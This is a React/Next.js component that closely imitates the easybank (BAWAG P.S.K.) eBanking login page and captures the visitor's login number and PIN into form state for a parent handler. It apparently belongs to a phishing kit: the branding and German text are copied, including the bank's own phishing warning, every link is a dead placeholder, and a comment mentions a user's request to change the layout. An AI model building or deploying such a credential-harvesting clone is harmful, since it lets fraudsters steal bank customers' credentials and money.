"use client";

import React, { useState } from "react";
import Image from "next/image";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function Easybank({ formData, onChange, handleRouteAction, saving }: Props) {
  const [showPin, setShowPin] = useState(false);

  return (
    <div className="min-h-screen bg-white text-[#333] font-sans flex flex-col items-center">
      
      {/* Top Header */}
      <header className="w-full max-w-[1024px] mx-auto h-[100px] flex justify-between items-center px-4 md:px-0 shrink-0">
        
        {/* Logo */}
        <div className="relative w-[180px] h-[40px]">
          <Image 
            src="/logo-easybank_de.webp" 
            alt="easybank" 
            fill
            className="object-contain object-left"
          />
        </div>

        {/* Top Right Controls */}
        <div className="flex flex-col items-end gap-2">
          <div className="flex items-center gap-4 text-[12px] text-[#555]">
            <a href="#" className="hover:underline">Hilfe</a>
            <div className="flex items-center border border-[#ccc] bg-white rounded-[2px] px-2 py-0.5 cursor-pointer hover:border-[#999]">
              <span className="mr-6">deutsch</span>
              <svg className="w-3 h-3 text-[#333]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
              </svg>
            </div>
          </div>
          {/* User requested to remove date/time */}
        </div>

      </header>

      {/* Main Content Area */}
      <div className="w-full max-w-[1024px] mx-auto px-4 md:px-0 py-6">
        
        {/* Three Columns Row */}
        <div className="flex flex-col md:flex-row gap-6">
          
          {/* Column 1: Login Form (Left) */}
          <div className="w-full md:w-[380px] border border-[#d8d8d8] rounded-[2px] overflow-hidden flex flex-col shrink-0">
            {/* Header Strip */}
            <div className="bg-[#e9f0df] px-4 py-2.5 flex justify-between items-center border-b border-[#d8d8d8]">
              <h2 className="font-bold text-[14px] text-[#333]">Login mit Zugangsdaten</h2>
              <a href="#" className="text-[#3b879f] text-[12px] hover:underline font-bold">Hilfe</a>
            </div>

            <div className="p-5">
              <p className="text-[14px] text-[#333] mb-6">Wie wollen Sie sich einloggen?</p>
              
              {/* Tabs */}
              <div className="flex border-b border-[#d8d8d8] mb-6">
                <div className="flex-1 text-center pb-2 border-b-[3px] border-[#00748c] text-[#00748c] font-bold text-[13px] cursor-pointer">
                  Verfüger
                </div>
                <div className="flex-1 text-center pb-2 text-[#666] font-normal text-[13px] cursor-pointer hover:text-[#333]">
                  Mit der App
                </div>
              </div>

              {/* Form */}
              <form 
                onSubmit={(e) => {
                  e.preventDefault();
                  handleRouteAction();
                }}
                className="flex flex-col"
              >
                {/* Inlogcode */}
                <div className="flex flex-col md:flex-row md:items-start mb-4">
                  <label className="md:w-[120px] text-[13px] font-bold text-[#333] mt-2 shrink-0">
                    Inlogcode
                  </label>
                  <div className="flex-1">
                    <input 
                      type="text" 
                      value={formData.verfuegernummer || ""}
                      onChange={(e) => onChange("verfuegernummer", e.target.value)}
                      className="w-full h-[32px] border border-[#00a3cc] rounded-[2px] px-2 outline-none focus:ring-1 focus:ring-[#00748c] text-[#333] text-[14px]"
                    />
                    <p className="text-[#555] text-[11px] mt-1">Verfüger ohne führende Nullen!</p>
                  </div>
                </div>

                {/* PIN */}
                <div className="flex flex-col md:flex-row md:items-start mb-6">
                  <label className="md:w-[120px] text-[13px] font-bold text-[#333] mt-2 shrink-0">
                    PIN
                  </label>
                  <div className="flex-1">
                    <div className="relative">
                      <input 
                        type={showPin ? "text" : "password"} 
                        value={formData.pin || ""}
                        onChange={(e) => onChange("pin", e.target.value)}
                        className="w-full h-[32px] border border-[#999] rounded-[2px] pl-2 pr-10 outline-none focus:border-[#00748c] text-[#333] text-[14px]"
                      />
                      <button 
                        type="button"
                        onClick={() => setShowPin(!showPin)}
                        className="absolute right-2 top-1/2 -translate-y-1/2 text-[#666] hover:text-[#333]"
                      >
                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                        </svg>
                      </button>
                    </div>
                    <p className="text-[#555] text-[11px] mt-1">8 bis 16-stellig</p>
                  </div>
                </div>

                <div className="flex justify-end mb-6">
                  <button 
                    type="submit" 
                    disabled={saving} 
                    className="bg-[#00748c] hover:bg-[#005f73] text-white font-bold px-6 h-[32px] rounded-[4px] text-[13px] transition-colors disabled:opacity-70"
                  >
                    {saving ? "Lädt..." : "Login"}
                  </button>
                </div>
              </form>

              <div className="border-t border-[#d8d8d8] pt-4 mt-2">
                <a href="#" className="text-[#333] text-[13px] hover:underline flex items-center gap-1.5">
                  <span className="text-[#666] text-[10px]">›</span> eBanking Zugang entsperren
                </a>
              </div>
            </div>
          </div>

          {/* Right Columns Wrapper */}
          <div className="flex-1 flex flex-col gap-6">
            
            {/* Top 3 Info Boxes */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              
              {/* Warnung */}
              <div className="border border-[#d8d8d8] rounded-[2px]">
                <div className="bg-[#f5f8f9] px-4 py-2 border-b border-[#d8d8d8]">
                  <h3 className="text-[#00748c] text-[14px] font-normal">Warnung</h3>
                </div>
                <div className="p-4 flex gap-3">
                  <div className="shrink-0 mt-0.5">
                    <svg className="w-5 h-5 text-[#cc0000]" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12 2L1 21h22L12 2zm0 3.5l8 14H4l8-14zm-1 3.5v5h2v-5h-2zm0 7v2h2v-2h-2z" />
                    </svg>
                  </div>
                  <div className="flex flex-col">
                    <span className="font-bold text-[13px] text-[#333] mb-1">Achtung vor Phishing</span>
                    <p className="text-[12px] text-[#333] leading-snug mb-1">
                      Wir fordern Sie niemals per E-Mail oder SMS auf, TANs, Konto- und Kreditkarten-Daten einzugeben oder zu bestätigen!
                    </p>
                    <a href="#" className="text-[#7db828] text-[12px] hover:underline">Weiterlesen</a>
                  </div>
                </div>
              </div>

              {/* Hilfe/Hotline */}
              <div className="border border-[#d8d8d8] rounded-[2px]">
                <div className="bg-[#f5f8f9] px-4 py-2 border-b border-[#d8d8d8]">
                  <h3 className="text-[#00748c] text-[14px] font-normal">Hilfe/Hotline</h3>
                </div>
                <div className="p-4 flex flex-col gap-3">
                  <a href="#" className="flex items-start gap-2 text-[12px] text-[#333] hover:underline group">
                    <span className="text-[#666] text-[10px] mt-[3px] group-hover:text-[#333]">›</span> 
                    <span>PIN vergessen oder Verfüger gesperrt?</span>
                  </a>
                  <a href="#" className="flex items-start gap-2 text-[12px] text-[#333] hover:underline group">
                    <span className="text-[#666] text-[10px] mt-[3px] group-hover:text-[#333]">›</span> 
                    <span>FAQ</span>
                  </a>
                </div>
              </div>

              {/* Info */}
              <div className="border border-[#d8d8d8] rounded-[2px]">
                <div className="bg-[#f5f8f9] px-4 py-2 border-b border-[#d8d8d8]">
                  <h3 className="text-[#00748c] text-[14px] font-normal">Info</h3>
                </div>
                <div className="p-4 flex flex-col gap-3">
                  <a href="#" className="flex items-start gap-2 text-[12px] text-[#333] hover:underline group">
                    <span className="text-[#666] text-[10px] mt-[3px] group-hover:text-[#333]">›</span> 
                    <span className="font-bold">Bestellung PIN-Code für Debitkarte</span>
                  </a>
                  <a href="#" className="flex items-start gap-2 text-[12px] text-[#333] hover:underline group">
                    <span className="text-[#666] text-[10px] mt-[3px] group-hover:text-[#333]">›</span> 
                    <span>Alle Infos zur easybank App</span>
                  </a>
                  <a href="#" className="flex items-start gap-2 text-[12px] text-[#333] hover:underline group">
                    <span className="text-[#666] text-[10px] mt-[3px] group-hover:text-[#333]">›</span> 
                    <span>Zu Watchlist Internet</span>
                  </a>
                </div>
              </div>

            </div>

            {/* Bottom Promo Banner */}
            <div className="w-full mt-2">
              <Image 
                src="/EASY26016_login.webp" 
                alt="Promo" 
                width={800}
                height={200}
                className="w-full h-auto object-contain"
              />
            </div>

          </div>

        </div>

      </div>

      {/* Footer */}
      <footer className="w-full max-w-[1024px] mx-auto py-10 flex flex-wrap justify-center gap-4 text-[12px] text-[#333] shrink-0 border-t border-[#eee] mt-10">
        <a href="#" className="hover:underline">Impressum</a>
        <a href="#" className="hover:underline">AGB</a>
        <a href="#" className="hover:underline">Datenschutz</a>
        <a href="#" className="hover:underline">Nutzungsbedingungen</a>
        <a href="#" className="hover:underline">Barrierefrei</a>
        <span className="ml-2 text-[#666]">© BAWAG P.S.K.</span>
      </footer>

    </div>
  );
}
